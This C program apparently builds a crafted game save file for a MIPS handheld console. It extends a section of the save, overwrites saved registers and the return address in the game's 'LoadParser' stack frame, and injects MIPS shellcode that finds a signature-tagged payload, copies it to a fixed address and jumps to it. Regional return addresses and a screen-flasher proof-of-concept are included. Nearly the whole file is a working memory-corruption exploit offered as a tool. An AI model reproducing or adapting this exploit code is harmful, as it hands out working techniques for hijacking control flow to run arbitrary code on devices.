#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <assert.h>

int gGermanVersion = 0;

int filesize(FILE *xifile)
{
  int lret;
  int lrc;

  lrc = fseek(xifile, 0, SEEK_END);
  if (lrc < 0)
  {
    printf("Failed seek\n");
  }

  lret = ftell(xifile);
  fseek(xifile, 0, SEEK_SET);

  return(lret);
}

#define DUMP_START  0x08400000
#define DUMP_END    0x0A000000

// this is the target destination for the bootstrap code.  Set it to a region filled with zeros.
#if 0
#define ELF_START   0x08B2FD00   // should be zeros on UK and DE
#else
#define ELF_START   0x08804000              
#endif


#define PAYLOAD_DESTINATION 0x08556100;
#define SIGNATURE_A         0x01234567;
#define SIGNATURE_B         0x89abcdef;


/*****************************************************************************/
/* Relocate the payload to a known-safe place                                */
/*                                                                           */
/* Do this by searching for the signature string 0x0123456789ABCDEF          */
/*****************************************************************************/
unsigned int pcode[] =
{

     0x00000000,  //   nop                                     #
     0x00000000,  //   nop                                     #
     0x00000000,  //   nop                                     #
     0x00000000,  //   nop                                     #

     /************************************************************************/
     /* Original C:                                                          */
     /*                                                                      */
     /* unsigned long *lptr  = CODE_SCAN_START;                              */
     /* unsigned long *ldest = 0x48556100;                                   */
     /*                                                                      */
     /* while (!((*(lptr++) == 0x01234567) && (*(lptr++) == 0x89abcdef)))    */
     /* {                                                                    */
     /* }                                                                    */
     /*                                                                      */
     /* while (ldest < (unsigned long *)0x08566100L)                         */
     /* {                                                                    */
     /*   *ldest++ = *lptr++;                                                */
     /* }                                                                    */
     /*                                                                      */
     /* asm ("j 0x48556100; nop;");                                          */
     /*                                                                      */
     /*                                                                      */
     /* ASM:  (note on entry s5 = our entry point, so use that as the        */
     /*        scan start addr)                                              */
     /*                                                                      */
     /* - find string   : comparison words in a2, v1                         */
     /* - copy n-bytes                                                       */
     /* - call the entry point                                               */
     /*                                                                      */
     /* I could optimise the code below, but it doesn't seem necessary       */
     /************************************************************************/
#if 1
     // payload linked to addr 0x08556100

     0x3c020123,     // lui     v0,0x123
     0x3c044900,     // lui     a0,0x4900 Search user mem from 0x0900 0000
//   0x26a40000,     // addiu   a0,s5,0   -- couldn't be bothered looking up a better opcode :)
     0x34464567,     // ori     a2,v0,0x4567
     0x8c820000,     // lw      v0,0(a0)
     0x3c0389ab,     // lui     v1,0x89ab
     0x3463cdef,     // ori     v1,v1,0xcdef
     0x10460005,     // beq     v0,a2,SECOND_CHECK
     0x24850004,     // addiu   a1,a0,4
               
                     // SEARCH_LOOP:
     0x00a02021,     // move    a0,a1
     0x8c820000,     // lw      v0,0(a0)
     0x1446fffd,     // bne     v0,a2,SEARCH_LOOP
     0x24850004,     // addiu   a1,a0,4
               
                     // SECOND_CHECK:
     0x8c820004,     // lw      v0,4(a0)
     0x1443fffa,     // bne     v0,v1,SEARCH_LOOP
     0x24850008,     // addiu   a1,a0,8

     0x3c024855,     // lui     v0,0x4855
     0x3c034856,     // lui     v1,0x4856
     0x34446100,     // ori     a0,v0,0x6100
     0x34630000,     // ori     v1,v1,0x0000
//   0x34636100,     // ori     v1,v1,0x6100   // copy less data for safety

                     // COPY_LOOP:
     0x8ca20000,     // lw      v0,0(a1)
     0xac820000,     // sw      v0,0(a0)
     0x24840004,     // addiu   a0,a0,4
     0x1483fffc,     // bne     a0,v1,COPY_LOOP
     0x24a50004,     // addiu   a1,a1,4

#if 1

     // insert a new loop to pause before jumping
     // might be nice to insert a cache flush if possible                    
     0x3c024855,     // lui     v0,0x4855
     0x3c03486a,     // lui     v1,0x486A
     0x34446100,     // ori     a0,v0,0x6100
     0x34636100,     // ori     v1,v1,0x6100

                     // COPY_LOOP:
     0x00000000,     // nop             
     0x00000000,     // nop             
     0x24840004,     // addiu   a0,a0,4
     0x1483fffc,     // bne     a0,v1,COPY_LOOP
     0x24a50004,     // addiu   a1,a1,4

#endif

     0x00000000,  //   nop                                     #
     0x00000000,  //   nop                                     #
     0x00000000,  //   nop                                     #

     0x0a155840,     // j       0x8556100
     0x00000000,     // nop
#else
     
     /************************************************************************/
     /* Simple screenflasher for proof-of-concept                            */
     /************************************************************************/
     0x24040000,    //  li  a0,0
     0x2405FFFF,    //  li  a1,0xFFFF
     0x24070100,    //	li	a3,256
     0x3c064420,    //	lui	a2,0x4420
     0x3c024400,    //	lui	v0,0x4400
     // L3     
     0xac440000,    //	sw	a0,0(v0)
     // L1        
     0x24420004,    //	addiu	v0,v0,4
     0x5446fffe,    //	bnel	v0,a2,L1
     0xac440000,    //	sw	a0,0(v0)
     0x3c024400,    //	lui	v0,0x4400
     0x3c034420,    //	lui	v1,0x4420
     0xac450000,    //	sw	a1,0(v0)
     // L2
     0x24420004,    //	addiu	v0,v0,4
     0x5443fffe,    //	bnel	v0,v1,L2
     0xac450000,    //	sw	a1,0(v0)
     0x24e7ffff,    //	addiu	a3,a3,-1
     0x14e0fff4,    //	bnez	a3,L3
     0x3c024400     //	lui	v0,0x4400

#endif
};

void sw(char* p, int n)
{
    *((int*)p) = n;
}

int lw(char* p)
{
    return (*((int*)p));
}


/*****************************************************************************/
/* Usage:                                                                    */
/*   hack  <infile> <codefile> <outfile>                                     */
/*                                                                           */
/* Infile must contain DE, US, UK, or JP                                     */
/*****************************************************************************/
main(int argc, char* argv[])
{
    FILE* filein = NULL;
    FILE* fileout = NULL;

    if (argc < 4)
    {
      printf("not enough args: hack infile payloadfile outfile\n");
      exit(1);
    }

    //
    // Read file
    //
    char* pszFile1 = argv[1];
    filein = fopen(pszFile1, "rb");
    if (!filein)
    {
        fprintf(stderr, "Couldn't open input file %s\n", pszFile1);
        exit(1);
    }
    int nBytes = filesize(filein);

    if (strstr(pszFile1, "DE"))
    {
      printf("German specials activated\n");
      gGermanVersion = 1;
    }

    printf("input file size: %d\n", nBytes);

    char* pdata = (char*)malloc(nBytes + 500000);
    if (pdata == NULL)
    {
        fprintf(stderr, "malloc failed\n");
        exit(2);
    }
    memset(pdata, 0, nBytes + 500000);
    int nBytesRead = fread(pdata, 1, nBytes, filein);
    printf("reading %s, %d bytes\n", pszFile1, nBytesRead);
    if (nBytesRead != nBytes)
    {
        fprintf(stderr, "fread failed\n");
        exit(3);
    }
    fclose(filein);

    // Add payload signature
    sw(pdata+nBytes,   0x01234567);
    sw(pdata+nBytes+4, 0x89abcdef);
    nBytes+=8;

    //
    // Read file
    //
    char* pszFile2 = argv[2];
    filein = fopen(pszFile2, "rb");
    if (!filein)
    {
        fprintf(stderr, "Couldn't open program file %s\n", pszFile2);
        exit(1);
    }
    int nProgramBytes = filesize(filein);
    char *pProgramData = pdata + nBytes;
    int nBytesReadProgram = fread(pProgramData, 1, nProgramBytes, filein);
    printf("reading %s, %d bytes\n", pszFile2, nBytesReadProgram);
//    printf("Read to %p\n", pProgramData);
    if (nBytesReadProgram != nProgramBytes)
    {
        fprintf(stderr, "fread failed\n");
        exit(3);
    }
    fclose(filein);

    nBytes += nProgramBytes;
    nProgramBytes += 0x100;





    //
    // In LoadParser
    //
    char* sp = pdata + 8 - 0x10;






    ///////////////////////////
    //
    // Multi call execute code
    //

    //
    // Extend SIMP section
    //
    int nExtend = 12 + 0x0150 + nProgramBytes;
    sw(pdata + 4, lw(pdata + 4) + nExtend);

//    printf("Memmove: %p from %p size %d\n", pdata + 0x00c4 + nExtend, pdata + 0x00c4, nBytes - 0x00c4);
    memmove(pdata + 0x00c4 + nExtend, pdata + 0x00c4, nBytes - 0x00c4);
    memset(pdata + 0x00c4, 0, nExtend);
    nBytes += nExtend;

    pProgramData += nExtend;






    //
    // lw  s0, $00cc(sp)
    // lw  s1, $00d0(sp)
    // lw  ra, $00d4(sp)
    //



    sw(sp + 0x00cc, 0x02a00008);                              // s0    jr  s5    (s5 = sp + $0040)
    sw(sp + 0x00d0, ELF_START - 0x00000040 + 0x40000000);     // s1    overwrite string, don't cache

    if (!gGermanVersion)
    {
      sw(sp + 0x00d4, 0x0890AF00);                  // ra
    }
    else
    {
      printf("German jump addr\n");
      sw(sp + 0x00d4, 0x0890Aeb0);                  // ra
    }

    // Return from LoadParser, now in LoadAndReEstablishPlayer's context
    sp += 0x00e0;



    // Second return
    sw(sp + 0x0018, ELF_START - 0x00000080);  // ra   string memory


#if 1
    // Filename used by code, remember sp has been advanced by 0x0020
    memcpy(sp + 0x0030, "ms0:/dumpa.bin", 0x16);
#endif


    // Insert code
//    printf("Copy %p to %p size %08lX\n", pcode, sp+0x0040, sizeof(pcode));
    memcpy(sp + 0x0040, pcode, sizeof(pcode));

//    printf("Copy %p to %p size %08lX\n", pProgramData - 8, sp+0x0140, nProgramBytes + 8);
    memcpy(sp + 0x0140, pProgramData - 8, nProgramBytes + 8);








    //
    // Write file
    //
    char* pszFileout = argv[3];
    fileout = fopen(pszFileout, "wb");
    if (!fileout)
    {
        printf("Failed to open out file");
        exit(4);
    }
    printf("%d bytes written to %s\n", fwrite(pdata, 1, nBytes, fileout), pszFileout);
    fclose(fileout);




    free(pdata);
    return (0);
}
